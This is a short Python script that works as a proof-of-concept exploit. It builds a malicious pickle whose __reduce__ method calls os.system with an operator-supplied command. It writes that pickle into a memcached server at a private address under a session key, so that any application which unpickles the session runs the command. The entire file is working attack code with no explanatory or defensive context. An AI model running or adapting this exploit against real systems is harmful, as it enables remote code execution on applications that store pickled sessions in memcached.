import os
import sys
import socket
import pickle
from pymemcache.client import base
COMMAND = sys.argv[1]

class PickleRCE(object):
    def __reduce__(self):
        return (os.system,(COMMAND,))

client = base.Client(("192.168.128.59",11211))
client.set('session:whoami',pickle.dumps(PickleRCE()))
print(client.get('session:whoami'))
